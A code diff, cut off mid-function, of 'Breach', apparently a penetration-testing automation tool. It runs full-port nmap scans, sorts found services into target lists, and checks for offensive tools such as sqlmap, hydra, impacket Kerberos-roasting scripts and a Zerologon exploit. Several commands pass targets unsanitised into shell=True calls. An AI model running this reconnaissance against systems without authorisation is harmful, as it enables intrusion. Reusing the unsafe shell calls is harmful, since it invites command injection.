+  elif os.path.isfile(Breach.targets):
+    # print("Target is file... reading")
+    Breach.targets = parse_file(Breach.targets)
+  else:
+    Breach.targets = [Breach.targets]
+  Breach.targets_len = len(Breach.targets)
+  if Breach.targets_len == 0:
+    print("Target file is empty..")
+  elif Breach.targets_len > 1 and not Breach.single_target:
+    print("Breaching " + str(Breach.targets_len) + " Targets!\n")
+  if Breach.single_target:
+    with open(Breach.targetfile, "w") as outfile:
+      outfile.write("\n".join(Breach.targets))
+    Breach.targets = Breach.targetfile
 
-    if os.path.exists(F"{b.dir}/nmap_udp.xml"):
-      print(b.target+"/nmap_udp.xml exists.. skipping udp scan")
-    else:
-      print((F"\r{b.colors.CYAN}--- UDP Scanning: {b.target} {b.colors.ENDC}"+" "*b.ttywidth)[:b.ttywidth+1])
-      if Breach.ctf:
-        udp_scan = b.run_cmd(F"nmap -sU -sV -oX {b.dir}/nmap_udp.xml -Pn -vv --top-ports 100 {b.target} --open --min-rate 5000 --script-timeout 10m", "udp.txt", tout=9000)
-      else:
-        udp_scan = b.run_cmd(F"nmap -sU -sV -oX {b.dir}/nmap_udp.xml -Pn -vv --top-ports 100 {b.target} --open -T3 --script-timeout 10m", "udp.txt", tout=9000)
+def init_watch(name):
+  def watch_thread(name):
+    while True:
+      process_alive = False
+      for proc in psutil.process_iter():
+        procstr = " ".join(proc.cmdline())
+        # print(procstr)
+        try:
+          if name.lower() in procstr.lower():
+            if (not "bwatch" in procstr) and (not "breach" in procstr):
+              process_alive = True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+          pass
+      if not process_alive:
+        print(F"{Breach.red}\n\n[-] PROCESS DIED! STOPPING [-]{Breach.endc}")
+        # Breach.tmux.kill_session()
+        while len(Breach.cmd_pool) > 0:
+          for running_cmd in Breach.cmd_pool:
+            running_cmd.pane.cmd('kill-pane')
+            Breach.cmd_pool.remove(running_cmd)
+        os._exit(1)
+      time.sleep(10)
+  print("Running watch on process :" + Breach.watch)
+  watch_thread = threading.Thread(target=watch_thread, args=(name,))
+  watch_thread.daemon = True # to kill cmd_pool at the end
+  watch_thread.start()  
 
-    while not tcp_scan.isdone or not udp_scan.isdone:
-      time.sleep(1)
-
-    try:
-      b.run_cmd(F"searchsploit --nmap {b.dir}/nmap_tcp.xml", "searchsploit_tcp.txt")
-      b.run_cmd(F"searchsploit --nmap {b.dir}/nmap_udp.xml", "searchsploit_udp.txt")
-      found_svcs = []
-      if len(NmapParser.parse_fromfile(F'{b.dir}/nmap_tcp.xml').hosts) > 0:
-        found_svcs += NmapParser.parse_fromfile(F'{b.dir}/nmap_tcp.xml').hosts[0].services
-      if len(NmapParser.parse_fromfile(F'{b.dir}/nmap_udp.xml').hosts) > 0:
-        found_svcs += NmapParser.parse_fromfile(F'{b.dir}/nmap_udp.xml').hosts[0].services
-      for svc in found_svcs:
-        if not 'open' in svc.state:
-          continue
-        if svc.protocol == 'udp':
-          b.udp = True
-        else:
-          b.udp = False
-        if hasattr(svc, "tunnel"):
-          if svc.tunnel == "ssl":
-            b.ssl = True
-          else:
-            b.ssl = False
-        else:
-          b.ssl = False
-        # ! ip_x.txt collection
-        if len(Breach.targets) > 1:
-          if "http" in svc.service:
-            with open("ip_http.txt", "a") as outfil:
-              if "44" in str(svc.port):
-                outfil.write(F"https://{b.target}:{svc.port}\n")
-              else:
-                outfil.write(F"http://{b.target}:{svc.port}\n")
-          if "samba" in svc.service or "microsoft-ds" in svc.service or "smb" in svc.service:
-            with open("ip_smb.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "ftp" in svc.service:
-            with open("ip_ftp.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "ssh" in svc.service:
-            with open("ip_ssh.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "ldap" in svc.service:
-            with open("ip_ldap.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "kerberos" in svc.service:
-            with open("ip_dc.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "rdp" in svc.service:
-            with open("ip_rdp.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "mysql" in svc.service:
-            with open("ip_mysql.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "winrm" in svc.service:
-            with open("ip_winrm.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "telnet" in svc.service:
-            with open("ip_telnet.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-          if "printer" in svc.service or "ipp" in svc.service:
-            with open("ip_printer.txt", "a") as outfil:
-              outfil.write(F"{b.target}:{svc.port}\n")
-        b.svc = svc.service
-        b.port = svc.port
-        scanmess=b.colors.CYAN + ">>> Scanning " + svc.protocol + " " + svc.service + " on " + b.target + " port " + str(svc.port) + b.colors.ENDC + " "*b.ttywidth
-        print("\r" + scanmess[:b.ttywidth])
-        Breach.run_module(b)
-
-      noneFound = True
-      for filename in os.listdir(b.dir):
-        if not "nmap" in filename:
-          noneFound = False
-      if noneFound:
-        # shutil.rmtree(atk.dir)
-        print(F"would have deleted {b.dir} now. Nothing found.")
-      else:
-        with open(b.dir + "/_DONE", "w") as fil:
-          fil.write("_DONE")
-      print(F"\r{b.colors.HEADER}### Done Breaching {b.target}{b.colors.ENDC}" + " "*(b.ttywidth-20)) # this is not true > just all CMDs send
-    except Exception as e:
-      print(F"\r{Breach.colors.RED}[-] Nmap Error on {b.target}!{Breach.colors.ENDC}"+" "*(Breach.ttywidth-25))
-      print(e)
-      with open(b.dir + "/_ERROR", "w") as fil:
-        fil.write(traceback.print_exc())
-
-if __name__ == '__main__':
-  scriptdir = os.path.dirname(os.path.realpath(__file__))
-  if not "PROJECT" in os.getcwd():
-    input("You are not in a project dir! Press Enter to continue...")
-  if not os.getuid() == 0:
-    print("You are not root, re-run with sudo / bs")
-    exit(1)
-
-  Breach.parser = argparse.ArgumentParser()
-  Breach.parser.description = "Breach Targets (TIP: alias bview='sudo tmux -L breach_socket attach)"
-  Breach.parser.add_argument('targets',                   action='store', default=None, help='breachtarget: IP, CIDR, URL or File.')
-  Breach.parser.add_argument('-u', '--usr',               action='store', default=None, help='Username to use')
-  Breach.parser.add_argument('-p', '--password',          action='store', default=None, help='Password to use')
-  Breach.parser.add_argument('-g', '--gui',               action='store_true', default=False, help='Also run GUI Apps')
-  Breach.parser.add_argument('-to', '--ttyout',           action='store', default=False, help='Also write output to tty')
-  Breach.parser.add_argument('-ct', '--concurr_targets',  action='store', default=2, help='Number of targets to scan concurrently')
-  Breach.parser.add_argument('-cc', '--concurr_cmds',     action='store', default=2, help='Number of cmds to run concurrently')
-  Breach.parser.add_argument('-cw', '--connwatch',        action='store', default=None, help='Interrupt Scan on Connection Failure')
-  Breach.parser.add_argument('-ctf',                      action='store_true', default=False, help='Only run cmds relevant in CTF')
-  Breach.parser.add_argument('-rdom',                     action='store', default=None, help='Root Domain to use')
-  Breach.parse_breachargs()
-
-  Breach.basedir = os.getcwd()
-  Breach.ttywidth = int(check_output("tput cols", shell="/bin/bash").decode("UTF-8").strip())
-  Breach.filtrlog = open("filter.log", "w")
-  Breach.colors = SimpleNamespace(**Breach.colors)
+def init_tmux_session():
+  netns = check_output("ip netns identify", shell="/bin/bash").decode("UTF-8").strip()
+  if netns == "":
+    netns = "b_DEF"
+  else:
+    netns = "b_" + netns
+    print(Breach.cyan + "Using non-default namespace: " + netns + Breach.endc)
+    
+  server = libtmux.Server(socket_name=netns)
   try:
-    Breach.tmux = Breach.serv.new_session("B")
+    Breach.tmux = server.new_session(netns)
     Breach.tmux.attached_window.rename_window("-")
   except:
-    Breach.tmux = Breach.serv.list_sessions()[0]
+    Breach.tmux = server.sessions[0]
   Breach.tmux.cmd('set-option', 'default-command', "/bin/bash --init-file <(echo \"export PS1='';stty -echo;clear\")")
-  cmdwatch_thread = threading.Thread(target=Breach.init_cmdwatch, args=())
-  cmdwatch_thread.daemon = True # to kill cmdwatch at the end
-  cmdwatch_thread.start()
-  if Breach.connwatch:
-    connwatch_thread = threading.Thread(target=Breach.init_connwatch, args=())
-    connwatch_thread.daemon = True # to kill cmdwatch at the end
-    connwatch_thread.start()
 
-  try:
-    for target in Breach.targets:
-      b = Breach(target)
-      if Breach.connwatch:
-        maxthreads = int(Breach.concurr_targets)+2
-      else:
-        maxthreads = int(Breach.concurr_targets)+1
-      while threading.active_count() > maxthreads:
-        time.sleep(1)
-      # ! URL as target
-      if "http" in b.target:
-        if (b.target[-1] == "/"):
-          if b.target.count('/') != 3:
-            b.dir = b.basedir + "/" + b.target.split(":")[1].replace("/", "_")[2:-1]
-          else:
-            b.dir = b.basedir + "/" + b.target.split(":")[1][2:]
-        else:
-          if b.target.count('/') != 2:
-            b.dir = b.basedir + "/" + b.target.split(":")[1].replace("/", "_")[2:]
-          else:
-            b.dir = b.basedir + "/" + b.target.split(":")[1][2:]
-        os.system(F"mkdir -p {b.dir}")
-        if "https" in b.target:
-          b.svc = "https"
-          t = threading.Thread(target=Breach.run_module, args=(b,))
-        else:
-          b.svc = "http"
-          t = threading.Thread(target=Breach.run_module, args=(b,))
-      # ! IP as target
-      else:
-        t = threading.Thread(target=Breach.run_nmap, args=(b,))
-      t.daemon = True
-      t.start()
-
-    # while threading.active_count() > 2:
+def init_cmd_pool():
+  def pool_thread_func():
+    Breach.cmd_pool = []
     while True:
-      time.sleep(5)
-      if len(Breach.cmdwatch) == 0:
-        time.sleep(5)
-        if len(Breach.cmdwatch) == 0:
-          break
-    print(F"\r{Breach.colors.GREEN}+++ DONE +++" + " "*(b.ttywidth-20))
-    Breach.filtrlog.close()
+      if (len(Breach.cmd_pool) == 0):
+        time.sleep(1)
+      else:        
+        # CHECK RUNNING_CMD STATE
+        for running_cmd in Breach.cmd_pool:
+          curout = running_cmd.pane.cmd('capture-pane', '-p', '-S', '-', '-J').stdout
+          # check if timeout
+          curtim = int(time.time() - running_cmd.start_time)
+          running_cmd.istimeout = curtim > running_cmd.tout
+          # check if done / input required
+          if len(curout) > 0:
+            lastline = curout[-1]
+            running_cmd.isdone = lastline == "BREACHEND"
+            for stdin in running_cmd.stdinput:
+              time.sleep(1)
+              running_cmd.pane.send_keys(F"{stdin}")
+            running_cmd.stdinput = []
+            
+          if running_cmd.isdone or running_cmd.istimeout:
+            if running_cmd.istimeout:
+              cout = curout + ["TIMEOUT"]
+              with open("b.error", "a") as fil:
+                fil.write(F"\n# TIMEOUT: {running_cmd.target}: {running_cmd.cmd}\n")
+            else:
+              if len(curout) > 1:
+                cout = curout[:-1]  # remove BREACHEND
+              else:
+                cout = ""
+            cout = list(filter(None, cout)) # Remove empty strings
 
-  except KeyboardInterrupt:
-    print(F"{Breach.colors.RED}\n\n[-] Detected Ctrl + C ... Killing threads{Breach.colors.ENDC}")
-    Breach.filtrlog.close()
-    while len(Breach.cmdwatch) > 0:
-      for running_cmd in Breach.cmdwatch:
-        running_cmd.pane.cmd('kill-pane')
-        Breach.cmdwatch.remove(running_cmd)
+            cout_string = '\n'.join(cout)
+            if any(word in cout_string.lower() for word in ["error", "stacktrace", "command not found"]):
+              with open("b.error", "a+") as fil:
+                fil.seek(0)
+                file_content = fil.read().lower()
+                if str(cout_string).lower() not in file_content:
+                  fil.write(str(cout_string))
+                  
+            # CHECK LISTS / FILTERS
+            if running_cmd.wl:
+              whitelisted = False
+              for word in running_cmd.wl:
+                if any(word.lower() in string.lower() for string in cout):
+                  whitelisted = True
+              if not whitelisted:
+                cout = ""
+            if running_cmd.bl:
+              blacklisted = False
+              for word in running_cmd.bl:
+                if any(word.lower() in string.lower() for string in cout):
+                  blacklisted = True
+              if blacklisted:
+                cout = ""
+            if running_cmd.line_wl:
+              cout_clean = []
+              for word in running_cmd.line_wl:
+                for line in cout:
+                  if word.lower() in line.lower():
+                    cout_clean.append(line)
+              cout = cout_clean
+            if running_cmd.line_bl:
+              cout_clean = []
+              for line in cout:
+                has_blacklisted_word = any(word.lower() in line.lower() for word in running_cmd.line_bl)
+                if not has_blacklisted_word:
+                  cout_clean.append(line)
+              cout = cout_clean
+            
+            # Remove empty lines
+            cout = [x for x in cout if x.strip()]
+            
+            # Sort
+            if running_cmd.sort:
+              try:
+                if running_cmd.sort > 1:
+                  cout = sorted(cout, key=lambda x: x.split()[running_cmd.sort-1])
+                else:
+                  cout = sorted(cout)
+              except:
+                pass      
+              
+            cout = '\n'.join(cout)
+            if running_cmd.word_bl:
+              for word in running_cmd.word_bl:
+                cout = re.sub(word, "", cout, flags=re.IGNORECASE)
+                
+            # WRITE TO TTY / FILE
+            if cout != "" and cout != "TIMEOUT":
+              cmd_string = F"{Breach.blue}# {running_cmd.target}: {running_cmd.cmd}"[:Breach.ttywidth-5] + Breach.endc
+              if Breach.notty:
+                tqdm.write(cmd_string)
+              else:
+                tqdm.write(cmd_string + "\n" + cout)
+              if not Breach.nofile:
+                with open(running_cmd.outfile, "a") as fil:
+                  date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                  fil.write(F"\n# {running_cmd.target} ({date}): {running_cmd.cmd}\n{cout}\n")
+              if running_cmd.post:
+                run_quick_cmd(running_cmd.post)
+                  
+            # CLEANUP AND SET STATE 
+            with open("b.state", "a") as fil:
+              fil.write(running_cmd.cmd + "\n")
+            running_cmd.pane.cmd('kill-pane')
+            Breach.cmd_pool.remove(running_cmd)
+  
+  cmd_pool_thread = threading.Thread(target=pool_thread_func, args=())
+  cmd_pool_thread.daemon = True # to kill cmd_pool at the end
+  cmd_pool_thread.start()
+
+def init_sudo():
+  ''' This must be run once in the beginning of each module which runs some/all commands as sudo '''
+  if (os.geteuid() == 0): # WSLbox
+    Breach.sudo = ""
+  else:
+    Breach.sudo = getpass("This module requires elevated privileges. Enter your sudo password:\n")
+    sys.stdout.write("\033[F")  # Move cursor up one line
+    sys.stdout.write("\033[F")  # Move cursor up one line
+    sys.stdout.write("\033[K")  # Clear line
+  print("")
+  
+def run_cmd(cmd, outfile, target, stdinput=[], bl=False, wl=False, line_bl=False, line_wl=False, word_bl=False, word_wl=False, post=False, sort=False, tout=900):
+  running_cmd = {
+    "cmd": cmd,
+    "outfile": outfile,
+    "target": target,
+    "stdinput": stdinput, # Takes an array of strings which are written in stdin
+    "bl": bl,             # Dismiss output of cmd if it contains this word
+    "wl": wl,             # Dismiss output of cmd unless it contains this word
+    "line_bl": line_bl,   # Remove lines from output containing this word
+    "line_wl": line_wl,   # Only keep lines from output containing this word
+    "word_bl": word_bl,   # Remove word from output
+    "word_wl": word_wl,   # Probably useless? Only keep these words from output
+    "post": post,         # OS Command to execute after task is finished
+    "sort": sort,         # Sort output by this column (integer)(delim: space)
+    "tout": tout,
+    "istimeout": False,
+    "isdone": False,
+  }
+  running_cmd = SimpleNamespace(**running_cmd)
+  
+  if (not Breach.noresume) and (running_cmd.cmd in Breach.state):
+    Breach.skip_counter +=1
+    running_cmd.isdone = True
+    return running_cmd
+  if Breach.skip_counter > 0:
+    tqdm.write(Breach.blue + "Skipped "+ str(Breach.skip_counter) +" cmds (use --noresume to rescan)" + Breach.endc)
+    Breach.skip_counter = 0
+    
+  if "sudo" in running_cmd.cmd:
+    winnam = running_cmd.target + "_" + cmd.split(" ")[2]
+  else:
+    winnam = running_cmd.target + "_" + cmd.split(" ")[0]
+  while len(Breach.cmd_pool) >= int(Breach.concurr_cmds):
+    time.sleep(randrange(2))
+
+  running_cmd.pane = Breach.tmux.new_window(winnam, start_directory=Breach.basedir).attached_pane
+  running_cmd.start_time = time.time()
+  running_cmd.pane.send_keys(F"{cmd}; echo;echo BREACHEND")
+  if "sudo" in running_cmd.cmd  and (not os.geteuid() == 0):
+    if (not Breach.sudo) or (not "sudo -S" in running_cmd.cmd):
+      print("sudo command detected in module without sudo initialization or sudo -S set.. exit")
+      sys.exit(1)
+    time.sleep(1)
+    if "[sudo] password" in running_cmd.pane.cmd('capture-pane', '-p').stdout[1]:
+      running_cmd.pane.send_keys(F"{Breach.sudo}")
+    else:
+      print(F"{Breach.red}Error! sudo command did not ask for password!{Breach.endc}")
+      sys.exit(1)
+  Breach.cmd_pool.append(running_cmd)
+  return running_cmd
+
+def run_quick_cmd(cmd):
+  cmd = cmd + " 2>&1"
+  if "sudo" in cmd:
+    if ((not Breach.sudo) or (not "-S" in cmd)) and (not os.getuid() == 0):
+      print("sudo command detected in module without sudo initialization or -S flag in cmd.. exit")
+      sys.exit(1)
+    return run(cmd, input=Breach.sudo, shell=True, capture_output=True, text=True).stdout
+  else:
+    return run(cmd, shell=True, capture_output=True, text=True).stdout
+
+def parse_file(file):
+  ''' Creates array from file content (one item per line) '''
+  content = []
+  with open(file, "r") as fil:
+    for lin in fil.readlines():
+      content.append(lin.strip())
+  return content
+
+def get_state(target):
+  ''' returns true if target was already scanned '''
+  if not os.path.exists("b.state"):
+    os.system("touch b.state")
+    return False
+  identifier = F"{Breach.module} {target}"
+  with open("b.state", "r") as fil:
+    if identifier in fil.readlines():
+      return True
+    else:
+      return False
+
+def append_unique(input, filename):
+  lines = []
+  if os.path.isfile(filename):
+    with open(filename, 'r') as file:
+      lines = file.read().splitlines()
+  lines.append(input)
+  unique_lines = list(set(lines))
+  with open(filename, 'w') as file:
+    file.write('\n'.join(unique_lines) + '\n')
+
+def sort_markdown_file(file_path):
+  files = glob.glob(file_path)
+  for fil in files:
+    print("Sorting file: " + fil)
+    with open(fil, "r") as inputfile:
+      content = inputfile.read()
+    # Split the content into sections based on H1 headers
+    sections = content.split("\n# ")
+    first_section = sections.pop(0)
+    # Sort the sections based on the H1 header name
+    sorted_sections = sorted(sections, key=lambda x: x.split("\n", 1)[0].lower())
+    # Combine the sorted sections and write them back to the file
+    sorted_content = first_section + "\n# " + "\n# ".join(sorted_sections)
+    with open(fil, "w") as outfile:
+      outfile.write(sorted_content)
+
+def check_deps():
+  def run_dep_check(cmd):
+    result = run(cmd, shell=True, executable="/bin/bash", stdout=DEVNULL, stderr=DEVNULL).returncode
+    if result == 0:
+      print(Breach.green + "[+] " + cmd.split(" ")[0] + Breach.endc)
+    else:
+      print(Breach.red + "[-] " + cmd + Breach.endc)
+
+  print(Breach.cyan + "\n[>>>] global" + Breach.endc)
+  run_dep_check("msfconsole --help")
+  run_dep_check("nmap --help")
+  run_dep_check("curl --help")
+  run_dep_check("cme --help")
+  run_dep_check("hydra -h | grep -q Examples")
+  run_dep_check("searchsploit BREACH")
+  
+  print(Breach.cyan + "\n[>>>] http" + Breach.endc)
+  run_dep_check("whatweb --help")
+  run_dep_check("arjun --help")
+  run_dep_check("sslscan --help")
+  run_dep_check("openssl --help")
+  run_dep_check("ffuf --help")
+  run_dep_check("feroxbuster --help")
+  run_dep_check("shcheck.py --help")
+  run_dep_check("wafw00f --help")
+  run_dep_check("cewl --help")
+  run_dep_check("slowhttptest -h | grep Usage")
+
+  print(Breach.cyan + "\n[>>>] http (scan modules)" + Breach.endc)
+  run_dep_check("sqlmap --help")
+  run_dep_check("commix --help")
+  run_dep_check("xsstrike --help")
+  run_dep_check("xsrfprobe --help")
+  run_dep_check("bolt --help")
+  run_dep_check("nuclei --help && nuclei -update-templates")
+  run_dep_check("nikto --help")
+  
+  print(Breach.cyan + "\n[>>>] smb" + Breach.endc)
+  run_dep_check("enum4linux --help | grep -q 'next generation'")
+  run_dep_check("manspider --help")
+  run_dep_check("showmount --help")
+  run_dep_check("smbmap -h")
+    
+  print(Breach.cyan + "\n[>>>] ssh" + Breach.endc)
+  run_dep_check("ssh-audit --help ")
+
+  print(Breach.cyan + "\n[>>>] domain" + Breach.endc)
+  run_dep_check("theHarvester -h && cat /etc/theHarvester/api-keys.yaml | grep -q -e 'key: \".*\"'")
+  run_dep_check("subfinder -h && cat ~/.config/subfinder/provider-config.yaml | grep -q -e '- .*'")
+  run_dep_check("dig -h")
+  run_dep_check("dnsrecon --help")
+
+  print(Breach.cyan + "\n[>>>] ldap" + Breach.endc)
+  run_dep_check("ldapsearch-ad --help")
+  run_dep_check("ade -h")
+  
+  print(Breach.cyan + "\n[>>>] sip" + Breach.endc)
+  run_dep_check("sipscan.py --help")
+
+  print(Breach.cyan + "\n[>>>] krb" + Breach.endc)
+  run_dep_check("zerologon -h | grep cve-2020-1472")
+  run_dep_check("impacket-GetNPUsers -h")
+  run_dep_check("impacket-GetUserSPNs -h")
+    
+  print(Breach.cyan + "\n[>>>] vpn" + Breach.endc)
+  run_dep_check("ike-scan --help")
+  run_dep_check("iker -h")
+
+  print(Breach.cyan + "\n[>>>] rpc" + Breach.endc)
+  run_dep_check("impacket-rpcdump --help")
+    
+  print(Breach.cyan + "\n[>>>] snmp" + Breach.endc)
+  run_dep_check('download-mibs TEST | grep "Downloading documents"')  # sudo apt install snmp-mibs-downloader
+  run_dep_check('snmpbrute -h | grep -q Usage')
+  run_dep_check('snmpwalk -h 2>&1| grep APPOPTS')  # sudo apt install snmp
+  run_dep_check('snmpbulkwalk -h 2>&1| grep APPOPTS')
+  
+  print(Breach.cyan + "\n[>>>] printer" + Breach.endc)
+  run_dep_check('pret -h')
+  
+  print(Breach.cyan + "\n[>>>] osint" + Breach.endc)
+  run_dep_check("chromedriver -h")
+  run_dep_check("google-chrome -h") # wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+  run_dep_check("proxychains --help | grep 'More help'")
+  run_dep_check("ddgr -h")
+  run_dep_check("googler -h")
+
+  sys.exit(0)
+
+# ! ################################################################## BREACHES
+
+def breach_ip(target):
+  def append_svclist(ip, port, name): 
+    with open(F"{name}", "a") as outfil:
+        outfil.write(F"\n{ip}:{port}")
+    run_quick_cmd(F'temp_file=$(mktemp) && sort -u {name} | sed "/^$/d" > "$temp_file" && mv "$temp_file" {name}')
+  def svclist_thread():
+    while not running_nmap.isdone:
+      time.sleep(1)
+    found_svcs = []
+    try:
+      if len(NmapParser.parse_fromfile(F'nmap/{target}.xml').hosts) > 0:
+        found_svcs += NmapParser.parse_fromfile(F'nmap/{target}.xml').hosts[0].services
+    except:
+      tqdm.write(F'{Breach.red}ERROR: Reading {target}.xml > deleting. Re-Run breach ip{Breach.endc}')
+      run_quick_cmd(F"grep -v '{target}.xml' b.state > temp.txt && mv temp.txt b.state")
+    
+    for svc in found_svcs:
+      if not 'open' in svc.state:
+        continue
+      port = svc.port
+
+      service_lower = svc.service.lower()
+      if int(svc.port) > 40000 and int(svc.port) < 50000:
+        append_svclist(target, port, "win_ports.ip")
+      elif "http" in svc.service.lower() and str(svc.port) not in ["5985", "47001", "593", "49676"]:
+        append_svclist(target, port, "http.ip")
+      elif any(x in service_lower for x in ["samba", "microsoft-ds", "smb"]):
+        append_svclist(target, port, "smb.ip")
+      elif "ftp" in service_lower:
+        append_svclist(target, port, "ftp.ip")
+      elif "ssh" in service_lower:
+        append_svclist(target, port, "ssh.ip")
+      elif "ldap" in service_lower:
+        append_svclist(target, port, "ldap.ip")
+      elif "kerberos" in service_lower:
+        Breach.post.append("cat krb.ip | grep 88 | cut -d':' -f1 > krb_88.ip")
+        append_svclist(target, port, "krb.ip")
+      elif "rdp" in service_lower:
+        append_svclist(target, port, "rdp.ip")
+      elif "mysql" in service_lower:
+        append_svclist(target, port, "mysql.ip")
+      elif any(x in service_lower for x in ["kerberos-sec", "krb", "kerberos"]):
+        append_svclist(target, port, "krb.ip")
+      elif "winrm" in service_lower:
+        append_svclist(target, port, "winrm.ip")
+      elif any(x in service_lower for x in ["ike", "isakmp"]):
+        append_svclist(target, port, "ike.ip")
+      elif "telnet" in service_lower:
+        append_svclist(target, port, "telnet.ip")
+      elif "ftp" in service_lower:
+        append_svclist(target, port, "ftp.ip")
+      elif any(x in service_lower for x in ["domain", "dns"]):
+        if svc.protocol == 'udp':
+          append_svclist(target, port, "ns_udp.ip")
+        else:
+          append_svclist(target, port, "ns_tcp.ip")
+      elif any(x in service_lower for x in ["printer","ipp","jetdirect"]):
+        append_svclist(target, port, "printer.ip")
+      else:
+        with open("unknown.txt", "a") as fil:
+          formatted_line = f"{target:<15}\t{svc.protocol:<5}\t{svc.port:<6}\t{svc.service:<15}\n"
+          fil.write(formatted_line)
+        run_quick_cmd(F'temp_file=$(mktemp) && sort -u -k2,2n unknown.txt > "$temp_file" && mv "$temp_file" unknown.txt')
+    Breach.threadpool -= 1
+  def group_ip_md():
+    groups = {}
+    current_ip = None
+    current_content = []
+    with open("ip.md", 'r') as file:
+      for line in file:
+        line = line.strip()
+        if line.startswith('#'):
+          if current_ip and current_content:
+            key = tuple(current_content)
+            if key in groups:
+              groups[key].append(current_ip)
+            else:
+              groups[key] = [current_ip]
+
+          current_ip = line.split(' ')[1]
+          current_content = []
+        else:
+          current_content.append(line)
+
+      if current_ip and current_content:  # adding last section
+        key = tuple(current_content)
+        if key in groups:
+          groups[key].append(current_ip)
+        else:
+          groups[key] = [current_ip]
+
+    # sorted_groups = sorted(groups.items(), key=lambda x: ip_address(x[1][0]))     # Order the groups by IP address
+    sorted_groups = sorted(groups.items(), key=lambda x: len(x[1]), reverse=True)   # Order the groups by similar hosts count
+    
+    with open("ip_group.md", "w") as fil:
+      for content, ips in sorted_groups:
+        ips = sorted(ips)
+        fil.write('# ' + ', '.join(ips) + '\n')
+        for line in content:
+          fil.write('  ' + line + '\n')
+    
+    with open("ip_group.ip", "w") as fil:
+      for content, ips in sorted_groups:
+        ips = sorted(ips)
+        if len(ips) == 1:
+          fil.write(ips[0] + '\n')
+        elif len(ips) == 2:
+          fil.write(ips[0] + '\n')
+          fil.write(ips[1] + '\n')
+        else:
+          fil.write(ips[0] + '\n')
+          fil.write(ips[len(ips)//2] + '\n')
+          fil.write(ips[-1] + '\n')
+
+  if Breach.osint: osint_ip(target); return
+  if Breach.extract:
+    tqdm.write("Extracting on target: " + target)
+    running_nmap = SimpleNamespace(**{"isdone": "true"})
+    svclist_thread()
+    return
+  if Breach.group:
+    tqdm.write("Grouping ip.md content..")
+    group_ip_md()
+    sys.exit(0)
+  Breach.post.append("""grep -v -i -E '^49[0-9]{3}.*msrpc.*Microsoft Windows RPC' ip.md > temp.txt && mv temp.txt ip.md""")
+  Breach.post.append("""cat ip.md | grep open | awk '{printf "%-10s ", $1; $2=""; print substr($0, index($0, $3))}' | sort -u | sort -n > ip_open.txt""")
+  if not os.path.exists("nmap"): run_quick_cmd("mkdir -p nmap")
+
+  # SCAN (add this to get readable nmap out: -oN nmap/{target}.txt)
+  udp = "" if Breach.top else "U:$(cat /tmp/udp_top100),"
+  if Breach.ctf:
+    running_nmap = run_cmd(F"sudo -S nmap --host-timeout 9000 -sSUV -p {udp}T:1-65535 -oX nmap/{target}.xml -Pn -v {target} --min-rate 5000", "ip.md", target, line_wl=["/tcp", "/udp"], line_bl=["Discovered", "filtered"], word_bl=["syn-ack", "udp-response", "ttl", "64"], tout=9999)
+  elif Breach.top:
+    running_nmap = run_cmd(F"sudo -S nmap --host-timeout 9000 -sSUV -p {udp}T:$(cat /tmp/tcp_top1000) -oX nmap/{target}.xml -Pn -v {target}", "ip.md", target, line_wl=["/tcp", "/udp"], line_bl=["Discovered", "filtered"], word_bl=["syn-ack", "udp-response", "ttl", "64"], tout=9999)
+  else:
+    running_nmap = run_cmd(F"sudo -S nmap --host-timeout 9000 -sSUV -p {udp}T:1-65535 -oX nmap/{target}.xml -Pn -v {target}", "ip.md", target, line_wl=["/tcp", "/udp"], line_bl=["Discovered", "filtered"], word_bl=["syn-ack", "udp-response", "ttl", "64"], tout=9999)
+    # running_nmap = run_cmd(F"sudo -S nmap --host-timeout 9000 -sSV --top-ports 10 -oX nmap/{target}.xml -Pn -v {target}", "ip.md", target, line_wl=["/tcp", "/udp"], line_bl=["Discovered", "filtered"], word_bl=["syn-ack", "udp-response", "ttl", "64"], tout=9999)
+    
+  # WAIT
+  Breach.threadpool += 1
+  svc_list_thread = threading.Thread(target=svclist_thread)
+  svc_list_thread.daemon = True
+  svc_list_thread.start()
+
+def breach_net(target):
+  if Breach.quick:
+    outp = run_quick_cmd("nmap -sn -iL "+ target +" --min-rate 2000 --host-timeout 2s | egrep -v '(Unknown|latency|Starting Nmap)' | sed -E 's/^Nmap scan report for |^Host is up.|Nmap done: //' | sed ':a;N;$!ba;s/\\nMAC Address: / /g' |column -t") #, blacklist=["scanned","seems down"])
+    print(outp)
     sys.exit()
+  elif Breach.iponly:
+    if os.path.isfile("ip_alive.ip"):
+      with open("ip_alive.ip", "r") as f:
+        ip_array = f.readlines()
+    else:
+      ip_array = []
+    pre_length = len(ip_array)
+    nmap_output = run_quick_cmd(f"nmap -sn -n -iL {target} --min-rate 3000")
+    filtered_output = "\n".join(line for line in nmap_output.split("\n")
+                                if not any(ignore in line for ignore in ["Unknown", "latency", "Starting Nmap"]))
+    filtered_output = filtered_output.replace("Nmap scan report for ", "") \
+                                    .replace("Host is up.", "") \
+                                    .replace("Nmap done: ", "") \
+                                    .replace("\nMAC Address: ", " ") \
+                                    .replace("[0-9a-fA-F:]{17}", "") \
+                                    .replace("addresses", "") \
+                                    .replace("hosts", "") \
+                                    .strip()
+    print(filtered_output)
+    filtered_output = [line.split()[0] for line in filtered_output.split("\n")]
+    filtered_output.pop()
+    ip_array = ip_array + filtered_output
+    ip_array = list(map(lambda x:x.strip(),ip_array))   # Remove Newlines
+    ip_array = list(dict.fromkeys(ip_array))
+    with open("ip_alive.ip", "wt") as f:
+      f.write('\n'.join(sorted(ip_array)))
+    print(f"Updated ip_alive.ip. Current IP count: {len(ip_array)} (Previously: {pre_length})")
+    sys.exit()
+  elif Breach.deepscan:
+    def create_deepscan_files(ip_dict):
+      # Update ip_alive.ip
+      if os.path.isfile("ip_alive.ip"):
